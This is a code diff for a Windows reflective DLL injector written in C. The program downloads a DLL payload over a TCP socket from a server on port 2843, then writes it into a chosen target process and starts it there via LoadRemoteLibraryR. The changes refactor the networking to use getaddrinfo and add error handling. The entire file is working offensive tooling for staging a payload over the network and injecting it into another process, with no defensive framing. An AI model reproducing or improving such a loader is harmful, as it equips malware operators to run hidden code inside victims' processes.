@@ -92,6 +92,8 @@ HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLengt
 
 typedef int(__stdcall* f_funci)();
 
+#define DEFAULT_PORT "2843"
+
 int main(int argc, char** argv)
 {
 	HANDLE hTargetProcess = NULL;
@@ -109,18 +111,30 @@ int main(int argc, char** argv)
 		return 0;
 	}
 
+	struct addrinfo* result = NULL, hints;
+
 	// Initialize Winsock
 	WSADATA wsaData;
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-		// Handle initialization error
-		return 1;
+		ERROR_WITH_CODE("initialization failed");
 	}
 
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	// Resolve the server address and port
+    if (getaddrinfo(NULL, DEFAULT_PORT, &hints, &result) != 0) {
+        WSACleanup();
+		ERROR_WITH_CODE("getaddrinfo failed");
+    }
+
 	// Create socket
-	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+	SOCKET clientSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
 	if (clientSocket == INVALID_SOCKET) {
-		// Handle socket creation error
-		return 1;
+		WSACleanup();
+		ERROR_WITH_CODE("socket creation failed");
 	}
 
 	// Connect to the server
@@ -128,11 +142,10 @@ int main(int argc, char** argv)
 	serverAddr.sin_family = AF_INET;
 	serverAddr.sin_port = htons(2843);
 	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
-	if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-		// Handle connection error
+	if (connect(clientSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
 		closesocket(clientSocket);
 		WSACleanup();
-		return 1;
+		ERROR_WITH_CODE("connection failed");
 	}
 
 	// Receive data from the server and store in a buffer
@@ -142,26 +155,31 @@ int main(int argc, char** argv)
 		// Handle receive error
 		closesocket(clientSocket);
 		WSACleanup();
-		return 1;
+		ERROR_WITH_CODE("recv failed");
+	}
+
+	// shutdown the connection since no more data will be sent
+	if (shutdown(clientSocket, SD_SEND) == SOCKET_ERROR) {
+		closesocket(clientSocket);
+		WSACleanup();
+		ERROR_WITH_CODE("shutdown failed");
 	}
 
 	// Clean up
 	closesocket(clientSocket);
 	WSACleanup();
 
-	// Now you have the received DLL data in the receivedBuffer
-
 	// Create an LPVOID variable and copy the received data
 	LPVOID lpBuffer = malloc(bytesReceived); // Allocate memory for the LPVOID buffer
 	memcpy(lpBuffer, receivedBuffer, bytesReceived); // Copy received data to lpBuffer
 
-	unsigned char* byteData = (unsigned char*)lpBuffer;
-	for (int i = 0; i < bytesReceived; ++i) {
-		printf("%02X ", byteData[i]);
-		if ((i + 1) % 16 == 0)
-			printf("\n");
-	}
-	printf("\n");
+	//unsigned char* byteData = (unsigned char*)lpBuffer;
+	//for (int i = 0; i < bytesReceived; ++i) {
+	//	printf("%02X ", byteData[i]);
+	//	if ((i + 1) % 16 == 0)
+	//		printf("\n");
+	//}
+	//printf("\n");
 	
 	hTargetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
 		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwTargetProcessID);
@@ -173,7 +191,6 @@ int main(int argc, char** argv)
 		ERROR_WITH_CODE("Failed to inject the DLL");
 	printf("[+] Injected the DLL into process %d.", dwTargetProcessID);
 
-	// Don't forget to free lpBuffer when done using it
 	free(lpBuffer);
 
 	WaitForSingleObject(hModule, -1);
